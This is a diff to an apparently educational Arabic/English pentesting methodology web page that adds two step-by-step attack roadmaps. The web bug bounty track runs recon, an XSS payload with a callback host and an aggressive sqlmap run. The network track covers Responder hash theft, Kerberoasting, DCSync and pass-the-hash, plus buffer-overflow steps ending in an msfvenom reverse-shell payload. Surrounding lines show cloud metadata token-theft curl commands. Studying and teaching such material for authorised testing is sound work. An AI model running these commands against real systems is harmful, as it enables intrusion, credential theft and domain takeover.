@@ -461,13 +461,29 @@
       <div class="search-no-results" id="searchNoResults">No phases match your search.</div>
       
       
+      <!-- Category: MASTER ROADMAPS (COMPLETE TRACKS) -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-master-roadmaps')">
+          <span style="color: #00ff66;">🗺️ MASTER ROADMAPS (خارطة العمل الكاملة)</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-master-roadmaps" style="display: block;">
+          <div class="meth-item active" id="meth-ef-master_web_bounty" onclick="openMethPhase('master_web_bounty')" data-search="master roadmap web bug bounty end to end recon xss sqli idor logic">
+            <span>🎯</span> <strong style="color:#00e5ff;">Track 1: Web Bug Bounty Roadmap</strong>
+          </div>
+          <div class="meth-item" id="meth-ef-master_net_ad" onclick="openMethPhase('master_net_ad')" data-search="master roadmap network active directory bof domain admin responder kerberoast bloodhound">
+            <span>👑</span> <strong style="color:#ffb86c;">Track 2: Network, AD & BOF Roadmap</strong>
+          </div>
+        </div>
+      </div>
+
       <!-- Category: REAL ASSESSMENTS -->
       <div class="sidebar-category">
         <div class="category-title" onclick="toggleCategory('cat-assess')">
           <span style="color: #ffb86c;">📁 REAL ASSESSMENTS</span>
           <span>▼</span>
         </div>
-        <div class="category-items" id="cat-assess" style="display: block;">
+        <div class="category-items" id="cat-assess" style="display: none;">
           <div class="meth-item" id="meth-ef-assess-htb" onclick="openMethPhase('assess-htb')" data-search="hackthebox htb writeup corporate">
             🏴‍☠️ HTB: "Corporate"
           </div>
@@ -9561,6 +9577,220 @@ curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?
           <div class="cmd-block">
             <div class="cmd-header"><span class="cmd-lang">GCP Metadata Command (Requires Metadata-Flavor: Google Header)</span></div>
             <pre><code>curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"</code></pre>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           TRACK 1: COMPLETE WEB & BUG BOUNTY ROADMAP (END-TO-END)
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-master_web_bounty" style="display: block; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🎯</span> Track 1: Complete Web & Bug Bounty Roadmap</h2>
+          <p class="hero-tagline">خطة العمل الكاملة والشاملة لاختراق الويب والصيد في برامج الـ Bug Bounty من جمع المعلومات وحتى اكتشاف الثغرة واستلام الـ Bounty!</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔥 Master Playbook</span>
+            <span class="badge badge-tool">🔧 Subfinder · Httpx · Katana · GF · Dalfox · SQLmap · Burp Suite</span>
+          </div>
+        </div>
+
+        <!-- Timeline / Step-by-Step Flow -->
+        <div class="cyber-card">
+          <div class="card-header"><h3>📌 خطة مسار الويب والـ Bug Bounty (4 مراحل متتالية)</h3></div>
+          
+          <!-- PHASE 1 -->
+          <div style="border-left: 3px solid #00e5ff; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00e5ff; font-size:1.1rem; margin-bottom:8px;">المرحلة 1: Recon & Scope Filtering (جمع المعلومات وتصفية الأهداف)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">الهدف: تجميع كافة النطاقات والـ IPs الحية التابعة للمؤسسة وتصفيتها لاستخراج الأهداف ذات الحساسية العالية.</p>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.1 Subdomain Enumeration & Passive Mining</span></div>
+              <pre><code># Passive enumeration from 30+ sources
+subfinder -d target.com -all -silent | assetfinder --subs-only target.com | sort -u > all_subs.txt
+
+# Certificate Transparency Logs
+crt.sh -q -f %target.com | grep target.com | cut -d ">" -f2 | cut -d "<" -f1 | sort -u >> all_subs.txt</code></pre>
+            </div>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.2 Alive Filter & Tech Fingerprinting</span></div>
+              <pre><code># Filter alive HTTP/HTTPS services + get status code, title, and technology stack
+cat all_subs.txt | httpx -silent -sc -title -td -web-server -o alive_hosts.txt
+
+# Separate High-Value Targets (Dev, Admin, Staging, Internal, API)
+grep -E "dev|staging|admin|api|test|internal|stage|vpn|portal" alive_hosts.txt > priority_targets.txt</code></pre>
+            </div>
+          </div>
+
+          <!-- PHASE 2 -->
+          <div style="border-left: 3px solid #00ff66; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00ff66; font-size:1.1rem; margin-bottom:8px;">المرحلة 2: Content Discovery & JS Mining (استخراج الـ Endpoints والروابط)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">الهدف: استخراج كل الروابط التاريخية والـ JavaScript Files والـ Parameters المخفية.</p>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.1 Crawling & Wayback Mining</span></div>
+              <pre><code># Crawl live targets with Katana
+katana -u priority_targets.txt -jc -d 5 -silent -o crawled_urls.txt
+
+# Extract historic URLs from Wayback & AlienVault
+waybackurls target.com | gau --threads 10 >> crawled_urls.txt
+sort -u crawled_urls.txt > all_urls.txt</code></pre>
+            </div>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.2 GF Pattern Filtering for Parameters</span></div>
+              <pre><code># Categorize URLs by vulnerability patterns using GF
+cat all_urls.txt | gf xss | grep "=" > xss_params.txt
+cat all_urls.txt | gf sqli | grep "=" > sqli_params.txt
+cat all_urls.txt | gf ssrf | grep "=" > ssrf_params.txt
+cat all_urls.txt | gf idor | grep "=" > idor_params.txt
+cat all_urls.txt | gf lfi | grep "=" > lfi_params.txt</code></pre>
+            </div>
+          </div>
+
+          <!-- PHASE 3 -->
+          <div style="border-left: 3px solid #f97316; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#f97316; font-size:1.1rem; margin-bottom:8px;">المرحلة 3: Vulnerability Hunting Pipelines (مسارات فحص واستغلال الثغرات)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">الهدف: فحص الثغرات بدقة عالية باستخدام محركات الفحص والتحليل اليدوي بـ Burp Suite.</p>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">⚡ 3.1 XSS Automated Pipeline:</h5>
+            <div class="cmd-block">
+              <pre><code>cat xss_params.txt | qsreplace '"&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe --multicast -b https://your-xss-hunter.com</code></pre>
+            </div>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">💉 3.2 SQL Injection Pipeline:</h5>
+            <div class="cmd-block">
+              <pre><code>sqlmap -m sqli_params.txt --batch --random-agent --risk 3 --level 5 --dbs</code></pre>
+            </div>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">🔑 3.3 IDOR & Logic Flaws Manual Verification:</h5>
+            <ul style="color:#cbd5e1; line-height:1.8; margin-right:20px;">
+              <li>شغّل إضافة <strong>Autorize</strong> في Burp Suite واستبدل الكوكيز بـ User B.</li>
+              <li>استبدل <code>user_id=101</code> بـ <code>user_id=102</code> في جميع طلبات الـ REST API.</li>
+              <li>اختبر المبالغ السلبية <code>"quantity": -1</code> والتنقل المباشر لصفحات الـ Success في عملية الشراء.</li>
+            </ul>
+          </div>
+
+          <!-- PHASE 4 -->
+          <div style="border-left: 3px solid #a855f7; padding-left: 15px;">
+            <h4 style="color:#a855f7; font-size:1.1rem; margin-bottom:8px;">المرحلة 4: PoC Creation & Bug Report (إعداد التقرير واستلام المكافأة)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">استخدم حاسبة الـ **CVSS 3.1 & Report Builder** المدمجة بالدليل لصياغة تقرير محكم وإرساله لمنصة HackerOne / Bugcrowd!</p>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           TRACK 2: NETWORK, ACTIVE DIRECTORY & BOF ROADMAP (END-TO-END)
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-master_net_ad" style="display: none; --tool-color: #ffb86c;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">👑</span> Track 2: Network, Active Directory & BOF Roadmap</h2>
+          <p class="hero-tagline">خطة العمل الكاملة لاختراق الشبكات، الـ Active Directory من الصفر وحتى الـ Domain Admin، والـ Buffer Overflow!</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔥 Master Playbook</span>
+            <span class="badge badge-tool">🔧 Nmap · Responder · Impacket · CrackMapExec · BloodHound · Mona.py</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📌 خطة مسار الشبكات والـ Active Directory (4 مراحل متتالية)</h3></div>
+
+          <!-- PHASE 1 -->
+          <div style="border-left: 3px solid #ffb86c; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#ffb86c; font-size:1.1rem; margin-bottom:8px;">المرحلة 1: Network Recon & Port Scanning (استكشاف الشبكة والمنافذ)</h4>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.1 Host Discovery & Fast Port Scanning</span></div>
+              <pre><code># Discover active hosts on internal subnet
+netdiscover -r 192.168.1.0/24 -i eth0
+
+# Naabu Fast Port Scan on target IP range
+naabu -host 192.168.1.0/24 -top-ports 1000 -o live_ports.txt
+
+# Nmap Full Service & Script Scan
+nmap -sC -sV -p- -iL live_ports.txt -oA nmap_full_scan</code></pre>
+            </div>
+          </div>
+
+          <!-- PHASE 2 -->
+          <div style="border-left: 3px solid #00e5ff; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00e5ff; font-size:1.1rem; margin-bottom:8px;">المرحلة 2: Service Enumeration (فحص وتجميع بيانات الخدمات)</h4>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.1 SMB & SNMP Enumeration</span></div>
+              <pre><code># SMB Share & User Enumeration (Ports 139/445)
+enum4linux-ng -A 192.168.1.50
+smbclient -L //192.168.1.50/ -N
+crackmapexec smb 192.168.1.0/24 --shares
+
+# SNMP Community String Bruteforce (Port 161)
+onesixtyone -c public -i targets.txt
+snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.4.1.77.1.2.25</code></pre>
+            </div>
+          </div>
+
+          <!-- PHASE 3 -->
+          <div style="border-left: 3px solid #ef4444; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#ef4444; font-size:1.1rem; margin-bottom:8px;">المرحلة 3: Active Directory Hacking (من الصفر إلى Domain Admin)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">سلسلة هجمات الـ Active Directory المتتالية للسيطرة الكاملة على الـ Domain Controller:</p>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.1 LLMNR/NBT-NS Poisoning (سرقة ה- NTLMv2 Hashes):</h5>
+            <div class="cmd-block">
+              <pre><code># Start Responder on internal interface
+responder -I eth0 -dwv
+
+# Crack captured NTLMv2 Hashes using Hashcat
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.2 AS-REP Roasting & Kerberoasting (Impacket Suite):</h5>
+            <div class="cmd-block">
+              <pre><code># AS-REP Roasting (No pre-authentication users)
+impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
+
+# Kerberoasting (Request TGS for accounts with SPNs)
+impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt
+
+# Crack Hashes with Hashcat
+hashcat -m 18200 kerberoast.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.3 BloodHound Mapping & DCSync Domain Takeover:</h5>
+            <div class="cmd-block">
+              <pre><code># Collect AD Graph Data using bloodhound-python
+bloodhound-python -u 'user' -p 'password' -d domain.local -ns 192.168.1.10 -c All
+
+# DCSync Attack (Dump all Domain Controller Hashes including krbtgt)
+impacket-secretsdump domain.local/Administrator:password@192.168.1.10
+
+# Pass-the-Hash Execution as Domain Admin
+impacket-wmiexec -hashes :NTLM_HASH DomainAdmin@192.168.1.10</code></pre>
+            </div>
+          </div>
+
+          <!-- PHASE 4 -->
+          <div style="border-left: 3px solid #a855f7; padding-left: 15px;">
+            <h4 style="color:#a855f7; font-size:1.1rem; margin-bottom:8px;">المرحلة 4: Buffer Overflow Exploitation (هندسة عكسية للذاكرة)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">خطوات اختراق ذاكرة برامج الـ Windows 32-bit باستعمال Immunity Debugger & Mona.py:</p>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">BOF Step-by-Step Mona Commands</span></div>
+              <pre><code># 1. Generate Cyclic Pattern to find EIP Offset
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+# Find exact offset in Mona:
+!mona findmsp
+
+# 2. Identify Bad Characters
+!mona bytearray -b " "
+
+# 3. Find JMP ESP Module (No SEH, No ASLR, No DEP)
+!mona jmp -r esp -cpb " "
+
+# 4. Generate Reverse Shell Payload with msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b " " -f c</code></pre>
+            </div>
           </div>
         </div>
       </div>
